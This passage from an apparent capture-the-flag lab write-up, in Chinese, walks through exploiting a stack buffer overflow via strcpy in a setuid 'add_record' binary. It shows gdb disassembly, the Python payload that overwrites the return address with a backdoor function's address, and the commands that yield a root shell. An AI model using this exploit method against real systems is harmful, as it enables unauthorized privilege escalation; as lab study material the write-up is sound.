   0x080486c1 <+20>:	push   DWORD PTR [ebp+0x8]
   0x080486c4 <+23>:	lea    edx,[ebp-0x3a]
   0x080486c7 <+26>:	push   edx
   0x080486c8 <+27>:	mov    ebx,eax
   0x080486ca <+29>:	call   0x80484d0 <strcpy@plt>
   0x080486cf <+34>:	add    esp,0x10
   0x080486d2 <+37>:	nop
   0x080486d3 <+38>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080486d6 <+41>:	leave
   0x080486d7 <+42>:	ret
End of assembler dump.
```



调用了`0x80484d0 <strcpy@plt>`，strcpy函数存在缓冲区溢出漏洞



查看backdoor函数

```
gdb-peda$ disas backdoor
disas backdoor
Dump of assembler code for function backdoor:
   0x08048676 <+0>:	push   ebp
   0x08048677 <+1>:	mov    ebp,esp
   0x08048679 <+3>:	push   ebx
   0x0804867a <+4>:	sub    esp,0x4
   0x0804867d <+7>:	call   0x80485b0 <__x86.get_pc_thunk.bx>
   0x08048682 <+12>:	add    ebx,0x16c6
   0x08048688 <+18>:	sub    esp,0xc
   0x0804868b <+21>:	push   0x0
   0x0804868d <+23>:	call   0x8048530 <setuid@plt>
   0x08048692 <+28>:	add    esp,0x10
   0x08048695 <+31>:	sub    esp,0xc
   0x08048698 <+34>:	lea    eax,[ebx-0x13f8]
   0x0804869e <+40>:	push   eax
   0x0804869f <+41>:	call   0x80484f0 <system@plt>
   0x080486a4 <+46>:	add    esp,0x10
   0x080486a7 <+49>:	nop
   0x080486a8 <+50>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080486ab <+53>:	leave
   0x080486ac <+54>:	ret
End of assembler dump.
```



`0x8048530 <setuid@plt>`， `0x80484f0 <system@plt>`，这里明显存在可利用的点，我们可以在EIP注入backdoor的起始地址`0x08048676`，



### 执行payload

(在item2特殊字符有问题，换默认terminal就行了)

```
python -c "import struct; print('aa\n1\n1\n1\n' + 'A'*62 + struct.pack('I', 0x08048676))" > /tmp/payload.txt


[shadowflow@ShadowOS ~]$ cat /tmp/payload.txt
aa
1
1
1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv?
```



退出gdb。生成payload

```
gdb-peda$ q
q
socnet@socnet2:~$ python -c "import struct; print('aa\n1\n1\n1\n' + 'A'*62 + struct.pack('I', 0x08048676))" > /tmp/payload.txt
<+ struct.pack('I', 0x08048676))" > /tmp/payload.txt
socnet@socnet2:~$ cat /tmp/payload.txt
cat /tmp/payload.txt
aa
1
1
1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv�
```

重新进入gdb

```
socnet@socnet2:~$ gdb -q ./add_record
gdb -q ./add_record
Reading symbols from ./add_record...(no debugging symbols found)...done

```

执行

```

gdb-peda$ r < /tmp/payload.txt
r < /tmp/payload.txt
Starting program: /home/socnet/add_record < /tmp/payload.txt
Welcome to Add Record application
Use it to add info about Social Network 2.0 Employees
[New process 18307]
process 18307 is executing new program: /bin/dash
[New process 18308]
process 18308 is executing new program: /bin/bash
[Inferior 3 (process 18308) exited normally]
Warning: not running or target is remote
```

可以看见先起了dash，又启动了bash。



经过不断调试分析，最终执行方式如下

```
cat /tmp/payload.txt - | ./add_record
```



















































